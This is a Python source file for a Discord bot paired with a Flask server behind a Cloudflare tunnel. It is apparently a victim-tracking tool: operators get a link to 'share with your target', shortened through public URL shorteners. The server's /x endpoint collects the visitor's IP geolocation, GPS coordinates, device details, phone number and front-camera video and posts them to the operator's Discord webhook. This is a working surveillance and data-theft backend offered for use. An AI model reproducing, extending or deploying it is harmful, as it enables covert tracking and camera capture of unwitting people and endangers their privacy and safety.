import discord
import asyncio
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput
from discord.http import Route
from flask import Flask, request, send_from_directory
import os, subprocess, threading, json, base64, requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TOKEN = ""
PORT = 8080
WEBHOOK_URL_STORAGE = {}

app = Flask(__name__, static_folder='static')
current_tunnel_url = "ยังไม่พร้อมใช้งาน"

def get_geo_info(ip):
    try:
        api_url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,as,query"
        res = requests.get(api_url, timeout=3).json()
        if res.get('status') == 'success':
            return res
    except Exception as e:
        print(f"Geo API Error -> {e}")
    return None

@app.route('/')
def index():
    host_url = request.host_url.rstrip('/')
    if current_tunnel_url != "ยังไม่พร้อมใช้งาน":
        host_url = current_tunnel_url

    try:
        with open('index.html', 'r', encoding='utf-8') as f:
            html_content = f.read()
        html_content = html_content.replace('{{OG_IMAGE_URL}}', f"{host_url}/static/thumbnail.png")
        html_content = html_content.replace('{{OG_URL}}', f"{host_url}/")
        return html_content
    except:
        return "Error loading page", 500

@app.route('/success')
def success():
    return send_from_directory('.', 'success.html')

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

@app.route('/x', methods=['POST'])
def handle_target():
    data = request.get_json(silent=True) or {}
    info = data.get('info', {})
    video_front_data = data.get('video_front_base64', 'ERR_NO_VIDEO')
    coords = data.get('coords', None)

    user_id = request.args.get('id')

    if not user_id or user_id not in WEBHOOK_URL_STORAGE:
        print(f"Missing or Invalid User ID: {user_id}")
        return {"status": "error", "message": "unauthorized or missing id"}

    target_webhook = WEBHOOK_URL_STORAGE[user_id]

    try:
        forwarded_for = request.headers.get('X-Forwarded-For')
        if forwarded_for:
            ip_addr = forwarded_for.split(',')[0].strip()
        else:
            ip_addr = request.remote_addr
    except:
        ip_addr = "Unknown"

    geo = get_geo_info(ip_addr)

    if geo and geo.get('status') == 'success':
        city = geo.get('city', 'Unknown')
        region = geo.get('regionName', 'Unknown')
        country = geo.get('country', 'Unknown')
        lat = geo.get('lat', 0)
        lon = geo.get('lon', 0)
        isp = geo.get('isp', 'Unknown')

        location_str = f"City: {city}\nRegion: {region}\nCountry: {country}"
        map_url_ip = f"https://www.google.com/maps?q={lat},{lon}"
        isp_str = f"{isp}"
    else:
        location_str = "`❌` IP Geolocation Data Unavailable"
        map_url_ip = "#"
        isp_str = "Unknown"

    gps_link = "#"
    if coords and 'lat' in coords and 'lon' in coords:
        gps_link = f"https://www.google.com/maps?q={coords['lat']},{coords['lon']}&z=17"
        coords_str = f"Lat: {coords['lat']}, Lon: {coords['lon']}"
    else:
        coords_str = "`❌` GPS Data Not Available / Denied"

    video_status = "`✅` Yes" if video_front_data != "ERR_NO_VIDEO" else "`❌` No"

    embed = {
        "title": "`📷` Capture System",
        "description": "Target system details captured successfully.",
        "color": 0x5865F2,
        "thumbnail": {"url": "https://s12.gifyu.com/images/bkeIV.png"},
        "fields": [
            {"name": "`🌐` IP Address", "value": f"**`{ip_addr}`**", "inline": False},
            {"name": "`📍` Geo-Location (IP)", "value": location_str, "inline": False},
            {"name": "`🗺️` Map (IP)", "value": f"[Click to View Map]({map_url_ip})", "inline": False},
            {"name": "`🛰` GPS Coordinates", "value": coords_str, "inline": False},
            {"name": "`📍` Map (GPS)", "value": f"[Click to View GPS]({gps_link})", "inline": False},
            {"name": "`🏢` ISP Service", "value": isp_str, "inline": False},
            {"name": "`🖥️` Platform", "value": f"`{info.get('plt', 'Unknown')}`", "inline": True},
            {"name": "`🔋` Battery", "value": f"`{info.get('bat', 'Verified')}`", "inline": True},
            {"name": "`📏` Resolution", "value": f"`{info.get('res', 'Unknown')}`", "inline": True},
            {"name": "`📱` Phone", "value": f"`{info.get('phone', 'N/A')}`", "inline": True},
            {"name": "`📹` Front Video", "value": video_status, "inline": True},
            {"name": "`🌐` User Agent", "value": info.get('ua', 'Unknown')[:1024], "inline": False},
            {"name": "`⏱️` Timestamp", "value": f"`{info.get('time', 'Unknown')}`", "inline": False},
            {"name": "`🌐` Language", "value": f"`{info.get('lang', 'Unknown')}`", "inline": True}
        ],
        "footer": {"text": "Capture System"},
        "timestamp": info.get('time', 'Unknown') if 'T' in str(info.get('time', '')) else None
    }

    if embed["timestamp"] is None:
        del embed["timestamp"]

    files = []

    if video_front_data != "ERR_NO_VIDEO" and "," in video_front_data:
        try:
            raw_video = base64.b64decode(video_front_data.split(",")[1])
            files.append(("file", ("front_cam.webm", raw_video, "video/webm")))
        except Exception as e:
            print(f"Failed to decode front video: {e}")

    try:
        payload_data = {"payload_json": json.dumps({"embeds": [embed], "content": ""})}
        response = requests.post(
            target_webhook,
            data=payload_data,
            files=files if files else None,
            timeout=30
        )
        response.raise_for_status()

    except requests.exceptions.RequestException as err:
        print(f"Failed to send to Webhook: {err}")
        return {"status": "error", "message": f"Webhook sending failed: {err}"}
    except Exception as err:
        print(f"Unexpected error occurred: {err}")
        return {"status": "error", "message": f"Unexpected error occurred: {err}"}

    return {"status": "ok"}

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

class WebhookModal(Modal, title='🛠️ Setup Webhook'):
    webhook = TextInput(
        label='DISCORD WEBHOOK URL',
        placeholder='Paste your webhook URL here...',
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        user_id = str(interaction.user.id)
        WEBHOOK_URL_STORAGE[user_id] = self.webhook.value

        await asyncio.sleep(1)
        final_url = f"{current_tunnel_url}?id={user_id}" if current_tunnel_url != "ยังไม่พร้อมใช้งาน" else "Tunnel not ready."

        success_components = [
            {
                "type": 17,
                "components": [
                    {"type": 10, "content": (
                        "## **`✅ SETUP SUCCESSFUL`**\n\n"
                        "**System is ready.**\n\n"
                        f"`🔗 Your Link:` {final_url}\n\n"
                        "*Share this link with your target. Data will be sent to your webhook.*"
                    )},
                    {"type": 14},
                    {"type": 12, "items": [{"media": {"url": "https://s12.gifyu.com/images/bkeIV.png"}}]}
                ]
            }
        ]

        try:
            dm_channel = await interaction.user.create_dm()
            dm_route = Route(
                "POST",
                "/channels/{channel_id}/messages",
                channel_id=dm_channel.id,
            )
            await interaction.client.http.request(dm_route, json={
                "flags": 32768,
                "components": success_components
            })

            await interaction.followup.send(
                "**`📨 Link sent to your DMs. Check your messages.`**",
                ephemeral=True
            )
        except discord.errors.Forbidden:
            await interaction.followup.send(
                "**`❌ Cannot send DMs. Please enable DMs and try again.`**",
                ephemeral=True
            )
        except Exception as e:
            print(f"Error sending DM: {e}")
            await interaction.followup.send(
                "**`❌ Error sending DM. Please check your messages.`**",
                ephemeral=True
            )

class ShortenModal(Modal, title='🔗 Shorten Link'):
    target_link = TextInput(
        label='Paste the link from the system (from DM)',
        placeholder='https://xxxx.trycloudflare.com?id=...',
        style=discord.TextStyle.long,
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        original_url = self.target_link.value.strip()

        try:
            import urllib.parse
            safe_url = urllib.parse.quote(original_url, safe='')

            api_urls = [
                f"https://is.gd/create.php?format=simple&url={safe_url}",
                f"https://v.gd/create.php?format=simple&url={safe_url}",
                f"https://tinyurl.com/api-create.php?url={safe_url}"
            ]

            short_url = None
            for api_url in api_urls:
                try:
                    response = requests.get(api_url, timeout=10, verify=False)
                    if response.status_code == 200 and response.text.strip().startswith("http"):
                        short_url = response.text.strip()
                        break
                except:
                    continue

            if short_url:
                await interaction.followup.send(
                    f"## **`✅ LINK SHORTENED!`**\n\n"
                    f"**`🔗 Original:`**\n`{original_url}`\n\n"
                    f"**`✨ Shortened (Send to target):`**\n**`{short_url}`**",
                    ephemeral=True
                )
            else:
                await interaction.followup.send(
                    "> **`❌ All shortening services failed.`**\n"
                    "> *Hint: Check the link or try again later.*",
                    ephemeral=True
                )

        except requests.exceptions.RequestException as e:
            print(f"Network error: {e}")
            await interaction.followup.send(
                "> **`❌` Could not connect to shortening service.**",
                ephemeral=True
            )
        except Exception as e:
            print(f"Unexpected error: {e}")
            await interaction.followup.send(
                "> **`❌` An unexpected error occurred.**",
                ephemeral=True
            )


class ControlView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(
        label="Setup Webhook",
        style=discord.ButtonStyle.primary,
        custom_id="webhook_btn",
        emoji="<:hook:1100795299850637363>"
    )
    async def webhook_btn(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(WebhookModal())

    @discord.ui.button(
        label="Shorten Link",
        style=discord.ButtonStyle.secondary,
        custom_id="shorten_btn",
        emoji="<:link:1100795294280585257>"
    )
    async def shorten_btn(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(ShortenModal())

@bot.command()
async def hee(ctx):
    await ctx.message.delete()

    components = [
        {
            "type": 17,
            "components": [
                {"type": 10, "content": (
                    "## **`✅ CONTROL PANEL`**\n\n"
                    "> **ระบบพร้อมใช้งาน**\n"
                    "> เลือกเมนูด้านล่างเพื่อเริ่ม\n"
                    "> `⚡ Status:` Online\n"
                    "> `🔐 Access:` Private"
                )},

                {"type": 10, "content": (
                    "## **`📌 MENU`**\n"
                    "> `📷` เริ่มตั้งค่า Target\n"
                    "> `🛠️` ระบบจะสร้างลิงก์ให้อัตโนมัติ"
                )},
                {"type": 10, "content": (
                    "## **`📡 SYSTEM`**\n"
                    "> `⏳` Ready to deploy\n"
                    "> `🌐` Tunnel Active"
                )},
                {"type": 14},
                {"type": 12, "items": [{"media": {"url": "https://s12.gifyu.com/images/bkeIV.png"}}]},
                {"type": 1, "components": [
                    {
                        "type": 2,
                        "label": "Setup Webhook",
                        "style": 1,
                        "emoji": {"name": "hook", "id": "1100795299850637363"},
                        "custom_id": "webhook_btn"
                    },
                    {
                        "type": 2,
                        "label": "Shorten Link",
                        "style": 2,
                        "emoji": {"name": "link", "id": "1100795294280585257"},
                        "custom_id": "shorten_btn"
                    }
                ]}
            ]
        }
    ]

    route = Route("POST", "/channels/{channel_id}/messages", channel_id=ctx.channel.id)
    await bot.http.request(route, json={"flags": 32768, "components": components})


@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")
    bot.add_view(ControlView())

def run_flask_app():
    print(f"[*] Starting Flask server on port {PORT}...")
    app.run(host='0.0.0.0', port=PORT, use_reloader=False)

def run_cloudflared_tunnel():
    global current_tunnel_url
    print("[+] Starting Cloudflared tunnel...")
    try:
        process = subprocess.Popen(['cloudflared', 'tunnel', '--url', f'http://127.0.0.1:{PORT}'],
                                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)

        tunnel_url_found = False
        for line in iter(process.stdout.readline, ''):
            print(f"[Cloudflared] {line.strip()}")
            if "https://" in line and ".trycloudflare.com" in line:
                url_part = line.split("https://")[1].split(" ")[0].strip()
                current_tunnel_url = f"https://{url_part}"
                print(f"[+] [LINK READY] Tunnel URL: {current_tunnel_url}")
                tunnel_url_found = True
                break

        if not tunnel_url_found:
            print("[!] Tunnel URL not found. Check cloudflared logs.")

    except FileNotFoundError:
        print("[ERROR] 'cloudflared' not found. Install and add to PATH.")
    except Exception as e:
        print(f"[ERROR] Cloudflared tunnel failed: {e}")

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask_app)
    flask_thread.daemon = True
    flask_thread.start()

    run_cloudflared_tunnel()

    if current_tunnel_url != "ยังไม่พร้อมใช้งาน":
        print("[+] Starting Discord Bot...")
        bot.run(TOKEN)
    else:
        print("[!] Bot cannot start: Tunnel URL unavailable.")